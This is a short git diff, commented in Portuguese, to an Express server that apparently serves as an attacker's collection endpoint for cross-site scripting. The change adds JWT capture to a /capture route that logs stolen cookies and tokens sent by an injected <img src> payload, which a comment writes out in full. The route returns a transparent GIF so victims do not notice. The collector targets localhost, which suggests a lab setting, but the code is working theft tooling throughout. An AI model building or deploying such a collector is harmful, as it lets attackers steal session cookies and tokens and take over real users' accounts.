@@ -74,14 +74,15 @@ function register(entry) {
   console.log(`[CAPTURA] ${entry.type} | ${entry.ip} | ${entry.url || ''}`);
 }
 
-// ── Endpoint GET /capture — exfiltração via <img src> ─────────────────────
-// Payload: <img src="http://localhost:4000/capture?type=cookie&data=DADOS&url=URL">
+// ── Endpoint GET /capture — exfiltração via <img src> ou location= ────────
+// Payload: <img src="http://localhost:4000/capture?type=jwt&data=COOKIE&jwt=TOKEN&url=URL">
 app.get('/capture', (req, res) => {
   register(buildEntry(req, {
     type:  req.query.type  || 'get',
     data:  req.query.data  || '',
     url:   req.query.url   || '',
     extra: req.query.extra || '',
+    jwt:   req.query.jwt   || '',
   }));
   res.setHeader('Content-Type', 'image/gif');
   res.send(TRANSPARENT_GIF);
